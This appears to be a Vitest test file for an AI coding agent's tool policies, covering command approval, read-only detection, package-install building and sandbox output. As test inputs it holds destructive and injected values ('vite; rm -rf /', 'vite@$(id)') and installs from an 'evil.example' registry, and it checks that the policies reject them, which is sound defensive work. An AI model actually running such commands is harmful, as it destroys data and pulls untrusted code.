import { describe, expect, it } from "vitest";
import { supersededSources } from "../apps/agent-api/src/code-tool-superseded-source";
import { ActiveContextResolver } from "../apps/agent-api/src/active-context-resolver";
import { parseCodeSearchOutput } from "../apps/agent-api/src/code-search-output";
import { classifyShellCommand } from "../apps/agent-api/src/code-shell-classifier";
import { commandChangesNothing } from "../apps/agent-api/src/code-shell-read-only";
import { classifyTerminalCommand } from "../apps/agent-api/src/terminal-command-policy";
import { codeToolModelStatus, CODE_TOOL_MODEL_STATUS } from "../apps/agent-api/src/code-tool-visibility";
import { toFailure } from "../apps/agent-api/src/code-tool-runtime-hooks";
import { SandboxProviderError } from "../apps/agent-api/src/sandbox-provider";
import { SsrfPolicyError } from "../apps/agent-api/src/ssrf-policy";
import { withoutRuntimeNoise } from "../apps/agent-api/src/project-sandbox-sync";
import { packageAddCommand } from "../apps/agent-api/src/code-deps-policy";

const match = (line: number) => JSON.stringify({ type: "match", data: { path: { text: "./a.js" }, line_number: line, lines: { text: `row ${line}\n` } } });

describe("code.fs.grep output", () => {
  it("reports a result cut by the output limit as truncated instead of failing", () => {
    const parsed = parseCodeSearchOutput(`${match(1)}\n${match(2)}\n{"type":"match","data":{"pa`, 100, 0);
    expect(parsed.matches.map((item) => item.line)).toEqual([1, 2]);
    expect(parsed.truncated).toBe(true);
  });

  it("still refuses a broken row in the middle of the output", () => {
    expect(() => parseCodeSearchOutput(`{"type":"mat\n${match(2)}\n`, 100, 0)).toThrow(/malformed JSON/);
  });
});

describe("commands that need no copy back from the sandbox", () => {
  it.each([
    ["pwd", []], ["ls", ["-la"]], ["wc", ["-l", "a.js"]], ["git", ["status"]], ["git", ["log", "--oneline"]],
    ["node", ["--check", "a.js"]], ["npm", ["ls"]], ["npm", ["view", "vite", "version"]],
  ])("%s %j changes nothing", (executable, args) => {
    expect(commandChangesNothing(executable, args, [executable, ...args].join(" "))).toBe(true);
  });

  it.each([
    ["npm", ["install"]], ["npm", ["run", "build"]], ["node", ["server.js"]], ["git", ["commit", "-m", "x"]],
    ["find", [".", "-delete"]], ["sort", ["-o", "b", "a"]],
  ])("%s %j may change files", (executable, args) => {
    expect(commandChangesNothing(executable, args, [executable, ...args].join(" "))).toBe(false);
  });

  it("does not trust a command with a redirect or a chain", () => {
    expect(commandChangesNothing("cat", ["a"], "cat a > b")).toBe(false);
    expect(commandChangesNothing("ls", [], "ls && rm -rf x")).toBe(false);
  });
});

describe("everyday package commands", () => {
  it.each(["npm ls", "npm ls lodash", "npm ls --depth=0", "npm view vite version", "npm audit --json", "npm install -D vite", "npm install --save-dev vite @vitejs/plugin-react", "npm run typecheck", "npm run backend"])("allows %s in both policies", (command) => {
    expect(classifyTerminalCommand(command).requiresApproval).toBe(false);
    expect(classifyShellCommand(command).risk).not.toBe("approval");
  });

  it.each(["npm run deploy", "npm run migrate", "npm run release", "npm view https://evil.example/x", "npm install -D vite --registry=https://evil.example"])("keeps %s behind approval", (command) => {
    expect(classifyTerminalCommand(command).requiresApproval).toBe(true);
  });
});

describe("a new TypeScript file replaces its JavaScript twin", () => {
  it("names the twins of a source file only", () => {
    expect(supersededSources("src/App.tsx")).toEqual(["src/App.jsx", "src/App.js"]);
    expect(supersededSources("src/tasks.ts")).toEqual(["src/tasks.jsx", "src/tasks.js"]);
    expect(supersededSources("src/env.d.ts")).toEqual([]);
    expect(supersededSources("vite.config.ts")).toEqual([]);
    expect(supersededSources("src/App.test.tsx")).toEqual([]);
    expect(supersededSources("src/App.jsx")).toEqual([]);
  });
});

describe("the project a chat message points at", () => {
  const owner = { workspaceId: "w", userId: "u", permissions: [] } as never;
  const company = { id: "c", name: "Acme", status: "active" };
  const opened = { id: "open", name: "e2e-open", companyId: "c", status: "ready" };
  const other = { id: "other", name: "Test", companyId: "c", status: "ready" };
  const resolver = () => new ActiveContextResolver({
    listCompanies: async () => ({ items: [company], nextCursor: null }),
    listCompanyAgentsPage: async () => ({ items: [], nextCursor: null }),
    listProjects: async () => [opened, other],
    getCompany: async () => company,
    getProject: async (_a: unknown, _c: string, id: string) => (id === "other" ? other : opened),
  } as never);
  const route = (message: string) => resolver().resolveNamedCompany(owner, { company, project: opened } as never, message, { intent: "EDIT_PROJECT" } as never, "");

  it("stays in the open project for words that only contain another project's name", async () => {
    expect(await route("Show the latest contest results")).toBeUndefined();
  });

  it("stays in the open project for a description of it", async () => {
    expect(await route("Build a TODO app in this empty test project")).toBeUndefined();
  });

  it("treats a new value as text, not as a project", async () => {
    expect(await route("Change the page title to 'Test'")).toBeUndefined();
    expect(await route("Поміняй заголовок на Test")).toBeUndefined();
  });

  it("still switches when the other project is named", async () => {
    expect((await route("Fix the header in the Test project"))?.project?.id).toBe("other");
  });
});

describe("code.deps.add", () => {
  it("names the package it was asked to add, with scripts off", () => {
    expect(packageAddCommand("npm", "vite", false)).toBe("npm install vite --ignore-scripts --no-fund");
    expect(packageAddCommand("npm", "@vitejs/plugin-react@4.2.0", true)).toBe("npm install @vitejs/plugin-react@4.2.0 --save-dev --ignore-scripts --no-fund");
    expect(packageAddCommand("pnpm", "vite", true)).toBe("pnpm add vite -D --ignore-scripts");
    expect(packageAddCommand("npm", "react@18.3.1", false)).toBe("npm install react@18.3.1 --ignore-scripts --no-fund");
  });

  it("passes the terminal gate in both policies", () => {
    for (const command of ["npm install vite --ignore-scripts --no-fund", "npm install vite --save-dev --ignore-scripts --no-fund", "pnpm add vite -D --ignore-scripts"]) {
      expect(classifyTerminalCommand(command).requiresApproval, command).toBe(false);
      expect(classifyShellCommand(command).risk, command).not.toBe("approval");
    }
  });

  it("refuses a spec that is not a plain package name", () => {
    for (const spec of ["vite; rm -rf /", "https://evil.example/x.tgz", "../local", "vite@$(id)"]) expect(packageAddCommand("npm", spec, false), spec).toBeNull();
  });
});

describe("command output", () => {
  it("drops the sandbox network helper lines and nothing else", () => {
    const cleaned = withoutRuntimeNoise({ stdout: "a\nsent tapfd=7 for tap0\nreceived tapfd=7\nb\n", stderr: "sent tapfd=7 for tap0\nreceived tapfd=7\nreal error\n" });
    expect(cleaned).toEqual({ stdout: "a\nb\n", stderr: "real error\n" });
  });
});

describe("tool failures name their cause", () => {
  it("passes on the sandbox reason", () => {
    const failure = toFailure(new SandboxProviderError("workspace_sync_limit", "Project exceeds sandbox sync limits", 413), "code.shell.exec");
    expect(failure.error).toMatchObject({ code: "workspace_sync_limit", status: 413, message: "Project exceeds sandbox sync limits" });
  });

  it("says a web host is not allowed and that retrying will not help", () => {
    const failure = toFailure(new SsrfPolicyError("host_not_allowed" as never, "Destination host is not in the allowlist"), "code.web.fetch");
    expect(failure.error).toMatchObject({ code: "web_host_not_allowed", status: 403, retryable: false });
  });
});

describe("tool catalog", () => {
  it("hides tools that repeat another one, with the replacement named", () => {
    for (const name of ["code.fs.tree", "code.git.status", "code.git.diff", "code.git.log", "code.git.stage", "code.git.restore", "code.git.branch.create", "code.git.branch.switch", "code.symbols.outline", "code.fs.undo_last_turn", "code.data.rows.list", "code.agent.spawn_async", "code.agent.send_message", "code.agent.continue", "code.agent.interrupt"]) {
      expect(codeToolModelStatus(name).status, name).toBe("retired");
      expect(CODE_TOOL_MODEL_STATUS[name]?.reason.length, name).toBeGreaterThan(10);
    }
  });

  it("keeps the tools a run actually needs", () => {
    for (const name of ["code.fs.read", "code.fs.list", "code.fs.grep", "code.fs.write", "code.fs.edit", "code.shell.exec", "code.verify.run", "code.git.commit", "code.git.push", "code.finish"]) {
      expect(codeToolModelStatus(name).status, name).toBe("visible");
    }
  });
});
